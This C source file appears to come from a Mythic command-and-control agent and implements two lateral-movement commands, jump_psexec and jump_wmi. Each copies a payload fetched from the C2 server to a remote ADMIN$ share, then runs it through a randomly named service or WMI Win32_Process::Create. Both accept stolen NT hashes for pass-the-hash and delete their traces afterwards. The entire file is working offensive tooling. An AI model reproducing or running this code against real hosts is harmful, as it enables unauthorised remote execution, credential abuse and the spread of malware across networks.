/*
 * Lateral Movement Commands
 *
 *  jump_psexec  — Remote command execution via Windows Service Control Manager.
 *  jump_wmi     — Remote command execution via WMI Win32_Process::Create (COM/DCOM).
 */

#include "Tasks/LateralMovement.h"
#include "Tasks/Upload.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Debug.h"


#ifdef INCLUDE_CMD_JUMP_PSEXEC

#include <winsvc.h>

/* -----------------------------------------------------------------------
 *  Execution stage — called by UploadSync once the remote file is complete
 * ----------------------------------------------------------------------- */
static VOID LateralMovementPsexecExecute(PCHAR taskUuid, PFILE_UPLOAD ctx)
{
    SC_HANDLE       hSCM        = NULL;
    SC_HANDLE       hSvc        = NULL;
    SERVICE_STATUS  svcStatus   = { 0 };

    /* Re-impersonate if credentials were supplied for the initial write */
    if (ctx->LmLogonToken)
    {
        if (!ImpersonateLoggedOnUser(ctx->LmLogonToken))
        {
            DWORD err = GetLastError();
            _err("[psexec] Re-impersonate failed in execute: %d", err);
            PackageError(taskUuid, err);
            return;
        }
    }

    _dbg("[psexec] Execute: target=%s svc=%s exec=%s",
         ctx->LmTarget, ctx->LmSvcName, ctx->LmExecPath);

    hSCM = OpenSCManagerA(ctx->LmTarget, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        DWORD error = GetLastError();
        _err("[psexec] OpenSCManager failed on %s: %d", ctx->LmTarget, error);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    hSvc = CreateServiceA(
        hSCM,
        ctx->LmSvcName,             /* Service name  */
        ctx->LmSvcName,             /* Display name  */
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        ctx->LmExecPath,            /* Binary path   */
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hSvc)
    {
        DWORD error = GetLastError();
        _err("[psexec] CreateService failed: %d", error);
        DeleteFileA(ctx->LmUncPath);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    if (!StartServiceA(hSvc, 0, NULL))
    {
        DWORD error = GetLastError();
        if (error != ERROR_SERVICE_REQUEST_TIMEOUT)
        {
            _err("[psexec] StartService failed: %d", error);
            PackageError(taskUuid, error);
            DeleteService(hSvc);
            DeleteFileA(ctx->LmUncPath);
            goto cleanup;
        }
        _dbg("[psexec] StartService timeout (expected for non-SCM-aware binary)");
    }

    Sleep(2000);
    ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus);
    DeleteService(hSvc);
    DeleteFileA(ctx->LmUncPath);    /* best-effort — may fail if process holds it */

    {
        PPackage data = PackageInit(0, FALSE);
        PackageAddFormatPrintf(data, FALSE,
            "Executed on %s via service \"%s\".\nDropped: %s\n",
            ctx->LmTarget, ctx->LmSvcName, ctx->LmUncPath);
        PackageComplete(taskUuid, data);
        PackageDestroy(data);
    }

cleanup:
    if (ctx->LmLogonToken) RevertToSelf();
    if (hSvc) CloseServiceHandle(hSvc);
    if (hSCM) CloseServiceHandle(hSCM);
    /* ctx fields are freed by UploadFree() immediately after this returns */
}


/* -----------------------------------------------------------------------
 *  Setup stage — parse args, open remote file, kick off chunked upload
 * -----------------------------------------------------------------------
 *
 *  Parameters (in pack order):
 *    1. target       PCHAR — hostname or IP of the remote host
 *    2. file_name    PCHAR — random 10-char .exe name for the remote drop
 *    3. file_id      PCHAR — Mythic file UUID (36 chars) to fetch in chunks
 *    4. command      PCHAR — optional extra args appended to the binary path
 *    5. service_name PCHAR — service name to create (empty → random)
 *    6. username     PCHAR — optional "DOMAIN\\User"
 *    7. password     PCHAR — optional cleartext password (exclusive with hash)
 *    8. hash         PCHAR — optional NT hash for pass-the-hash
 *
 *  Flow:
 *    1. Parse args; build UNC drop path and local exec path
 *    2. If credentials: LogonUser + ImpersonateLoggedOnUser
 *    3. CreateFileA on UNC path (SMB session established under impersonated token)
 *    4. RevertToSelf (SMB connection persists on the open handle)
 *    5. Enqueue FILE_UPLOAD with OnComplete = LateralMovementPsexecExecute
 *    6. UploadGetChunk starts the chunked transfer from Mythic
 *    --- On final UPLOAD_RESP: UploadSync closes hFile → calls OnComplete ---
 *    7. OnComplete: re-impersonate → OpenSCManager → CreateService →
 *       StartService → cleanup → PackageComplete
 */
VOID LateralMovementPsexec(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    HANDLE          hFile       = INVALID_HANDLE_VALUE;
    HANDLE          hLogonToken = NULL;
    PFILE_UPLOAD    upload      = NULL;

    SIZE_T  sz       = 0;
    PCHAR   target   = NULL;
    PCHAR   fileName = NULL;
    PCHAR   fileId   = NULL;
    PCHAR   command  = NULL;
    PCHAR   svcParam = NULL;
    PCHAR   credUser = NULL;
    PCHAR   credPass = NULL;
    PCHAR   credHash = NULL;

    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("[psexec-setup] Got %d arguments", nbArg);

    if (nbArg < 3)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    target   = ParserStringCopy(arguments, &sz); sz = 0;
    fileName = ParserStringCopy(arguments, &sz); sz = 0;
    fileId   = ParserStringCopy(arguments, &sz); sz = 0;
    command  = (nbArg >= 4) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    svcParam = (nbArg >= 5) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    credUser = (nbArg >= 6) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    credPass = (nbArg >= 7) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    credHash = (nbArg >= 8) ? ParserStringCopy(arguments, &sz) : NULL;

    if (!target || !target[0] || !fileName || !fileName[0] || !fileId || !fileId[0])
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        goto cleanup;
    }

    char dropPath[MAX_PATH] = { 0 };
    _snprintf(dropPath, MAX_PATH - 1, "\\\\%s\\ADMIN$\\Temp\\%s", target, fileName);

    char execPath[MAX_PATH + 256] = { 0 };
    if (command && command[0])
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s %s", fileName, command);
    else
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s", fileName);

    char svcName[32] = { 0 };
    if (svcParam && svcParam[0])
        _snprintf(svcName, sizeof(svcName) - 1, "%s", svcParam);
    else
    {
        srand((unsigned int)GetTickCount() ^ (unsigned int)(ULONG_PTR)taskUuid);
        _snprintf(svcName, sizeof(svcName) - 1, "svc%08x", (unsigned int)rand());
    }

    _dbg("[psexec-setup] target=%s drop=%s exec=%s svc=%s",
         target, dropPath, execPath, svcName);

    /* Explicit credentials: impersonate for net-only logon.
     * LOGON32_LOGON_NEW_CREDENTIALS works for both cleartext passwords and NT hashes.
     * After CreateFileA the SMB session persists even after RevertToSelf. */
    if (credUser && credUser[0])
    {
        PCHAR cred = (credHash && credHash[0]) ? credHash :
                     (credPass && credPass[0]) ? credPass : NULL;
        if (cred)
        {
            char credDomain[256] = ".";
            char credUserPart[256] = { 0 };
            strncpy(credUserPart, credUser, sizeof(credUserPart) - 1);
            PCHAR bs = strchr(credUserPart, '\\');
            if (bs)
            {
                *bs = '\0';
                strncpy(credDomain, credUserPart, sizeof(credDomain) - 1);
                memmove(credUserPart, bs + 1, strlen(bs + 1) + 1);
            }
            _dbg("[psexec-setup] LogonUser domain=%s user=%s pth=%d",
                 credDomain, credUserPart, (credHash && credHash[0]));
            if (!LogonUserA(credUserPart, credDomain, cred,
                             LOGON32_LOGON_NEW_CREDENTIALS,
                             LOGON32_PROVIDER_DEFAULT, &hLogonToken))
            {
                DWORD err = GetLastError();
                _err("[psexec-setup] LogonUser failed: %d", err);
                PackageError(taskUuid, err);
                goto cleanup;
            }
            if (!ImpersonateLoggedOnUser(hLogonToken))
            {
                DWORD err = GetLastError();
                _err("[psexec-setup] ImpersonateLoggedOnUser failed: %d", err);
                PackageError(taskUuid, err);
                goto cleanup;
            }
        }
    }

    hFile = CreateFileA(dropPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLogonToken) RevertToSelf();

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        _err("[psexec-setup] CreateFileA failed on %s: %d", dropPath, err);
        PackageError(taskUuid, err);
        goto cleanup;
    }

    upload = (PFILE_UPLOAD)LocalAlloc(LPTR, sizeof(FILE_UPLOAD));
    if (!upload)
    {
        PackageError(taskUuid, ERROR_NOT_ENOUGH_MEMORY);
        goto cleanup;
    }

    strncpy(upload->TaskUuid, taskUuid, TASK_UUID_SIZE);
    strncpy(upload->fileUuid, fileId,   36);
    strncpy(upload->filepath, dropPath, sizeof(upload->filepath) - 1);
    upload->hFile        = hFile;   hFile = INVALID_HANDLE_VALUE;
    upload->currentChunk = 1;
    upload->OnComplete   = LateralMovementPsexecExecute;

    upload->LmTarget   = target;    target   = NULL;
    upload->LmExecPath = (PCHAR)LocalAlloc(LPTR, strlen(execPath) + 1);
    if (upload->LmExecPath) memcpy(upload->LmExecPath, execPath, strlen(execPath));
    upload->LmUncPath  = (PCHAR)LocalAlloc(LPTR, strlen(dropPath) + 1);
    if (upload->LmUncPath)  memcpy(upload->LmUncPath, dropPath, strlen(dropPath));
    upload->LmSvcName  = (PCHAR)LocalAlloc(LPTR, strlen(svcName) + 1);
    if (upload->LmSvcName)  memcpy(upload->LmSvcName, svcName, strlen(svcName));
    upload->LmCredUser  = credUser;  credUser = NULL;
    upload->LmCredPass  = credPass;  credPass = NULL;
    upload->LmCredHash  = credHash;  credHash = NULL;
    upload->LmLogonToken = hLogonToken; hLogonToken = NULL;

    UploadGetChunk(upload);
    UploadQueue(upload);
    upload = NULL;  /* ownership transferred */

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hLogonToken) { RevertToSelf(); CloseHandle(hLogonToken); }
    if (upload) UploadFree(upload);
    if (target)   LocalFree(target);
    if (fileName) LocalFree(fileName);
    if (fileId)   LocalFree(fileId);
    if (command)  LocalFree(command);
    if (svcParam) LocalFree(svcParam);
    if (credUser) LocalFree(credUser);
    if (credPass) LocalFree(credPass);
    if (credHash) LocalFree(credHash);
}

#endif  // INCLUDE_CMD_JUMP_PSEXEC


#ifdef INCLUDE_CMD_JUMP_WMI

/*
 * COM/WMI headers — CINTERFACE gives us the C-style vtable access pattern.
 * The CLSID/IID for IWbemLocator are hard-coded to avoid linking wbemuuid.
 */
#define _WIN32_DCOM
#define CINTERFACE
#include <objbase.h>
#include <wbemidl.h>

/* {4590F811-1D3A-11D0-891F-00AA004B2E24} */
static const CLSID CLSID_WbemLocatorX = {
    0x4590f811, 0x1d3a, 0x11d0,
    { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const IID IID_IWbemLocatorX = {
    0xdc12a687, 0x737f, 0x11cf,
    { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* Helper: narrow string → freshly allocated BSTR (caller SysFreeString) */
static BSTR NarrowToBstr(PCHAR src)
{
    if (!src || !src[0]) return NULL;
    int wlen = MultiByteToWideChar(CP_ACP, 0, src, -1, NULL, 0);
    WCHAR *tmp = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)wlen * sizeof(WCHAR));
    if (!tmp) return NULL;
    MultiByteToWideChar(CP_ACP, 0, src, -1, tmp, wlen);
    BSTR result = SysAllocString(tmp);
    HeapFree(GetProcessHeap(), 0, tmp);
    return result;
}

/* -----------------------------------------------------------------------
 *  Execution stage — called by UploadSync once the remote file is complete
 * ----------------------------------------------------------------------- */
static VOID LateralMovementWmiExecute(PCHAR taskUuid, PFILE_UPLOAD ctx)
{
    HRESULT             hr              = S_OK;
    IWbemLocator        *pLoc           = NULL;
    IWbemServices       *pSvc           = NULL;
    IWbemClassObject    *pClass         = NULL;
    IWbemClassObject    *pInParamsDef   = NULL;
    IWbemClassObject    *pInParams      = NULL;
    IWbemClassObject    *pOutParams     = NULL;

    BSTR bstrResource       = NULL;
    BSTR bstrWin32Process   = NULL;
    BSTR bstrCreate         = NULL;
    BSTR bstrCommandLine    = NULL;
    BSTR bstrCmdLineKey     = NULL;
    BSTR bstrReturnValue    = NULL;
    BSTR bstrProcessId      = NULL;

    VARIANT varCmd    = { 0 };
    VARIANT varRetVal = { 0 };
    VARIANT varPid    = { 0 };

    if (ctx->LmLogonToken)
    {
        if (!ImpersonateLoggedOnUser(ctx->LmLogonToken))
        {
            DWORD err = GetLastError();
            _err("[wmi] Re-impersonate failed in execute: %d", err);
            PackageError(taskUuid, err);
            return;
        }
    }

    _dbg("[wmi-execute] target=%s exec=%s", ctx->LmTarget, ctx->LmExecPath);

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        _err("[wmi] CoInitializeEx failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }
    CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);

    hr = CoCreateInstance(&CLSID_WbemLocatorX, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocatorX, (LPVOID *)&pLoc);
    if (FAILED(hr))
    {
        _err("[wmi] CoCreateInstance(IWbemLocator) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    {
        WCHAR wResource[512] = { 0 };
        _snwprintf(wResource, 511, L"\\\\%S\\root\\cimv2", ctx->LmTarget);
        bstrResource = SysAllocString(wResource);
    }

    /* ConnectServer with NULL user/pass — credentials come from the impersonated
     * token when present, otherwise the current process token. */
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrResource,
                                     NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr))
    {
        _err("[wmi] ConnectServer to %s failed: 0x%lx", ctx->LmTarget, hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    CoSetProxyBlanket((IUnknown *)pSvc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE);

    bstrWin32Process = SysAllocString(L"Win32_Process");
    hr = pSvc->lpVtbl->GetObject(pSvc, bstrWin32Process, 0, NULL, &pClass, NULL);
    if (FAILED(hr))
    {
        _err("[wmi] GetObject(Win32_Process) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    bstrCreate = SysAllocString(L"Create");
    hr = pClass->lpVtbl->GetMethod(pClass, bstrCreate, 0, &pInParamsDef, NULL);
    if (FAILED(hr))
    {
        _err("[wmi] GetMethod(Create) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    hr = pInParamsDef->lpVtbl->SpawnInstance(pInParamsDef, 0, &pInParams);
    if (FAILED(hr))
    {
        _err("[wmi] SpawnInstance failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    VariantInit(&varCmd);
    bstrCommandLine = NarrowToBstr(ctx->LmExecPath);
    V_VT(&varCmd)   = VT_BSTR;
    V_BSTR(&varCmd) = bstrCommandLine;
    bstrCmdLineKey  = SysAllocString(L"CommandLine");
    hr = pInParams->lpVtbl->Put(pInParams, bstrCmdLineKey, 0, &varCmd, 0);
    VariantClear(&varCmd);
    bstrCommandLine = NULL;
    if (FAILED(hr))
    {
        _err("[wmi] Put(CommandLine) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    hr = pSvc->lpVtbl->ExecMethod(pSvc, bstrWin32Process, bstrCreate,
                                   0, NULL, pInParams, &pOutParams, NULL);
    if (FAILED(hr))
    {
        _err("[wmi] ExecMethod failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    VariantInit(&varRetVal);
    VariantInit(&varPid);
    bstrReturnValue = SysAllocString(L"ReturnValue");
    bstrProcessId   = SysAllocString(L"ProcessId");
    if (pOutParams)
    {
        pOutParams->lpVtbl->Get(pOutParams, bstrReturnValue, 0, &varRetVal, NULL, NULL);
        pOutParams->lpVtbl->Get(pOutParams, bstrProcessId,   0, &varPid,    NULL, NULL);
    }

    {
        UINT32 wmiRet = (V_VT(&varRetVal) == VT_I4 || V_VT(&varRetVal) == VT_UI4)
                       ? (UINT32)V_UI4(&varRetVal) : 0xFFFFFFFF;
        UINT32 pid    = (V_VT(&varPid)    == VT_I4 || V_VT(&varPid)    == VT_UI4)
                       ? (UINT32)V_UI4(&varPid)    : 0;

        VariantClear(&varRetVal);
        VariantClear(&varPid);

        DeleteFileA(ctx->LmUncPath);    /* best-effort */

        if (wmiRet == 0)
        {
            PPackage data = PackageInit(0, FALSE);
            PackageAddFormatPrintf(data, FALSE,
                "Executed on %s via WMI Win32_Process::Create.\n"
                "Dropped: %s\nPID: %u\n",
                ctx->LmTarget, ctx->LmUncPath, pid);
            PackageComplete(taskUuid, data);
            PackageDestroy(data);
        }
        else
        {
            _err("[wmi] Win32_Process::Create returned %u", wmiRet);
            PackageError(taskUuid, wmiRet);
        }
    }

cleanup:
    if (ctx->LmLogonToken) RevertToSelf();
    VariantClear(&varCmd);
    VariantClear(&varRetVal);
    VariantClear(&varPid);
    if (bstrResource)       SysFreeString(bstrResource);
    if (bstrWin32Process)   SysFreeString(bstrWin32Process);
    if (bstrCreate)         SysFreeString(bstrCreate);
    if (bstrCommandLine)    SysFreeString(bstrCommandLine);
    if (bstrCmdLineKey)     SysFreeString(bstrCmdLineKey);
    if (bstrReturnValue)    SysFreeString(bstrReturnValue);
    if (bstrProcessId)      SysFreeString(bstrProcessId);
    if (pOutParams)    pOutParams->lpVtbl->Release(pOutParams);
    if (pInParams)     pInParams->lpVtbl->Release(pInParams);
    if (pInParamsDef)  pInParamsDef->lpVtbl->Release(pInParamsDef);
    if (pClass)        pClass->lpVtbl->Release(pClass);
    if (pSvc)          pSvc->lpVtbl->Release(pSvc);
    if (pLoc)          pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
}


/* -----------------------------------------------------------------------
 *  Setup stage — parse args, open remote file, kick off chunked upload
 * -----------------------------------------------------------------------
 *
 *  Parameters (in pack order):
 *    1. target    PCHAR — hostname or IP of the remote host
 *    2. file_name PCHAR — random 10-char .exe name for the remote drop
 *    3. file_id   PCHAR — Mythic file UUID (36 chars) to fetch in chunks
 *    4. command   PCHAR — optional extra args appended to the binary path
 *    5. username  PCHAR — optional "DOMAIN\\User"
 *    6. password  PCHAR — optional cleartext password (exclusive with hash)
 *    7. hash      PCHAR — optional NT hash for pass-the-hash
 */
VOID LateralMovementWmi(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    HANDLE          hFile       = INVALID_HANDLE_VALUE;
    HANDLE          hLogonToken = NULL;
    PFILE_UPLOAD    upload      = NULL;

    SIZE_T  sz        = 0;
    PCHAR   target    = NULL;
    PCHAR   fileName  = NULL;
    PCHAR   fileId    = NULL;
    PCHAR   command   = NULL;
    PCHAR   username  = NULL;
    PCHAR   password  = NULL;
    PCHAR   ntlm_hash = NULL;

    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("[wmi-setup] Got %d arguments", nbArg);

    if (nbArg < 3)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    target    = ParserStringCopy(arguments, &sz); sz = 0;
    fileName  = ParserStringCopy(arguments, &sz); sz = 0;
    fileId    = ParserStringCopy(arguments, &sz); sz = 0;
    command   = (nbArg >= 4) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    username  = (nbArg >= 5) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    password  = (nbArg >= 6) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    ntlm_hash = (nbArg >= 7) ? ParserStringCopy(arguments, &sz) : NULL;

    if (!target || !target[0] || !fileName || !fileName[0] || !fileId || !fileId[0])
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        goto cleanup;
    }

    char dropPath[MAX_PATH] = { 0 };
    _snprintf(dropPath, MAX_PATH - 1, "\\\\%s\\ADMIN$\\Temp\\%s", target, fileName);

    char execPath[MAX_PATH + 256] = { 0 };
    if (command && command[0])
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s %s", fileName, command);
    else
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s", fileName);

    _dbg("[wmi-setup] target=%s drop=%s exec=%s", target, dropPath, execPath);

    /* Credentials: impersonate for both the SMB file write and the later DCOM call.
     * LOGON32_LOGON_NEW_CREDENTIALS handles cleartext passwords and NT hashes alike. */
    if (username && username[0])
    {
        PCHAR cred = (ntlm_hash && ntlm_hash[0]) ? ntlm_hash :
                     (password  && password[0])  ? password  : NULL;
        if (cred)
        {
            char credDomain[256] = ".";
            char credUserPart[256] = { 0 };
            strncpy(credUserPart, username, sizeof(credUserPart) - 1);
            PCHAR bs = strchr(credUserPart, '\\');
            if (bs)
            {
                *bs = '\0';
                strncpy(credDomain, credUserPart, sizeof(credDomain) - 1);
                memmove(credUserPart, bs + 1, strlen(bs + 1) + 1);
            }
            _dbg("[wmi-setup] LogonUser domain=%s user=%s pth=%d",
                 credDomain, credUserPart, (ntlm_hash && ntlm_hash[0]));
            if (!LogonUserA(credUserPart, credDomain, cred,
                             LOGON32_LOGON_NEW_CREDENTIALS,
                             LOGON32_PROVIDER_DEFAULT, &hLogonToken))
            {
                DWORD err = GetLastError();
                _err("[wmi-setup] LogonUser failed: %d", err);
                PackageError(taskUuid, err);
                goto cleanup;
            }
            if (!ImpersonateLoggedOnUser(hLogonToken))
            {
                DWORD err = GetLastError();
                _err("[wmi-setup] ImpersonateLoggedOnUser failed: %d", err);
                PackageError(taskUuid, err);
                goto cleanup;
            }
        }
    }

    hFile = CreateFileA(dropPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLogonToken) RevertToSelf();

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        _err("[wmi-setup] CreateFileA failed on %s: %d", dropPath, err);
        PackageError(taskUuid, err);
        goto cleanup;
    }

    upload = (PFILE_UPLOAD)LocalAlloc(LPTR, sizeof(FILE_UPLOAD));
    if (!upload)
    {
        PackageError(taskUuid, ERROR_NOT_ENOUGH_MEMORY);
        goto cleanup;
    }

    strncpy(upload->TaskUuid, taskUuid, TASK_UUID_SIZE);
    strncpy(upload->fileUuid, fileId,   36);
    strncpy(upload->filepath, dropPath, sizeof(upload->filepath) - 1);
    upload->hFile        = hFile;   hFile = INVALID_HANDLE_VALUE;
    upload->currentChunk = 1;
    upload->OnComplete   = LateralMovementWmiExecute;

    upload->LmTarget   = target;    target    = NULL;
    upload->LmExecPath = (PCHAR)LocalAlloc(LPTR, strlen(execPath) + 1);
    if (upload->LmExecPath) memcpy(upload->LmExecPath, execPath, strlen(execPath));
    upload->LmUncPath  = (PCHAR)LocalAlloc(LPTR, strlen(dropPath) + 1);
    if (upload->LmUncPath)  memcpy(upload->LmUncPath, dropPath, strlen(dropPath));
    upload->LmCredUser  = username;  username  = NULL;
    upload->LmCredPass  = password;  password  = NULL;
    upload->LmCredHash  = ntlm_hash; ntlm_hash = NULL;
    upload->LmLogonToken = hLogonToken; hLogonToken = NULL;

    UploadGetChunk(upload);
    UploadQueue(upload);
    upload = NULL;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hLogonToken) { RevertToSelf(); CloseHandle(hLogonToken); }
    if (upload) UploadFree(upload);
    if (target)    LocalFree(target);
    if (fileName)  LocalFree(fileName);
    if (fileId)    LocalFree(fileId);
    if (command)   LocalFree(command);
    if (username)  LocalFree(username);
    if (password)  LocalFree(password);
    if (ntlm_hash) LocalFree(ntlm_hash);
}

#endif  // INCLUDE_CMD_JUMP_WMI
